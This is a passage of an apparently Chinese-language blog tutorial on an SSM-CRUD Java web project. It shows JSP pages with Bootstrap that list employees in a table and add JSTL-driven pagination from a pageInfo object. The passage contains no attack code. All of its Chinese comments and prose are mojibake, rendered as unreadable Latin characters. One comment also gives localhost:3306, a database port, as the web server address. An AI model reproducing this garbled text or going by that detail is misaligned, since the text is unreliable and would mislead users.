class="string">/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ ‡é¢˜--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æŒ‰é’®--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ˜¾ç¤ºè¡¨æ ¼æ•°æ®--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>qwe<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>ç”·<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>aaa@qq.com<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                ç¼–è¾‘</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                åˆ é™¤</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            åˆ†é¡µæ–‡å­—ä¿¡æ¯<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                å½“å‰è®°å½•æ•°ï¼šXXX</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            åˆ†é¡µæ¡ä¿¡æ¯<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>é¦–é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;laquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;raquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>æœ«é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>è¿™æ ·åŸºæœ¬çš„å‰ç«¯é¡µé¢æ¡†æ¶å°±å‡ºæ¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¡«å……æ•°æ®å°±å¥½äº†<br><img src="/img/JavaWeb/10-12å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><h1 id="å®ç°åˆ†é¡µæŸ¥è¯¢"><a href="#å®ç°åˆ†é¡µæŸ¥è¯¢" class="headerlink" title="å®ç°åˆ†é¡µæŸ¥è¯¢"></a>å®ç°åˆ†é¡µæŸ¥è¯¢</h1><p>æ¥ä¸‹æ¥å°±æ˜¯å°†æ•°æ®è§£æå¡«å……åˆ°å¯¹åº”ä½ç½®<br>list.jsp<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"><span class="xml">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="xml">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="xml">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆhttp://localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span><br><span class="line"><span class="xml">            http://localhost:3306/crud</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> <span class="attr">prefix</span>=<span class="string">"c"</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        pageContext.setAttribute("APP_PATH",request.getContextPath());</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ ‡é¢˜--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æŒ‰é’®--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ˜¾ç¤ºè¡¨æ ¼æ•°æ®--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"emp"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empId&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.gender=="M"?"ç”·":"å¥³"&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.email&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.department.deptName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    ç¼–è¾‘</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    åˆ é™¤</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            åˆ†é¡µæ–‡å­—ä¿¡æ¯<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                å½“å‰è®°å½•æ•°ï¼š$</span><span class="template-variable">&#123;pageInfo.pageNum&#125;</span><span class="xml">é¡µï¼Œæ€»$</span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml">é¡µ,æ€»$</span><span class="template-variable">&#123;pageInfo.total&#125;</span><span class="xml">æ¡è®°å½•</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            åˆ†é¡µæ¡ä¿¡æ¯<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=1"</span>&gt;</span>é¦–é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        æœ‰ä¸Šä¸€é¡µå†æ˜¾ç¤ºç®­å¤´ï¼Œæ²¡æœ‰åˆ™ä¸æ˜¾ç¤º<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span 